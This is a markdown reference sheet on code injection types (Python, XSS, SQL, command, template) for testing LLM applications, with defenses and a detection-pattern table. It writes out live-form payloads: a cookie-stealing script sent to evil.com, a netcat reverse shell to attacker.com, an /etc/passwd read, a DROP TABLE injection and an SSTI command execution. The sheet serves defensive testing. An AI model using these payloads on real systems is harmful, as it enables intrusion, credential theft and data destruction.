# Code Injection Attack Types

## Categories

### 1. Python Code Injection

**Risk:** Direct code execution in Python-based LLM applications

```python
# Dangerous patterns
__import__('os').system('command')
eval(user_input)
exec(user_input)
```

**Defense:** Never use eval/exec on user input

### 2. JavaScript Injection (XSS)

**Risk:** Client-side code execution, cookie theft

```javascript
<script>document.location='http://evil.com?c='+document.cookie</script>
```

**Defense:** Sanitize all output, use CSP headers

### 3. SQL Injection

**Risk:** Database manipulation, data theft

```sql
'; DROP TABLE users; --
' OR '1'='1
```

**Defense:** Parameterized queries, input validation

### 4. Command Injection

**Risk:** OS command execution

```bash
; cat /etc/passwd
| nc attacker.com 4444 -e /bin/sh
```

**Defense:** Avoid shell execution, allowlist commands

### 5. Template Injection (SSTI)

**Risk:** Server-side template code execution

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Defense:** Sandbox templates, validate input

## Detection Patterns

| Pattern | Indicates |
|---------|-----------|
| `__import__` | Python import bypass |
| `eval(`, `exec(` | Dynamic code execution |
| `<script>` | JavaScript injection |
| `'; --` | SQL injection |
| `| `, `; ` | Command chaining |

## Testing Priority

1. **CRITICAL:** Python/Command injection
2. **HIGH:** SQL/Template injection
3. **MEDIUM:** XSS
4. **LOW:** Indirect injection vectors
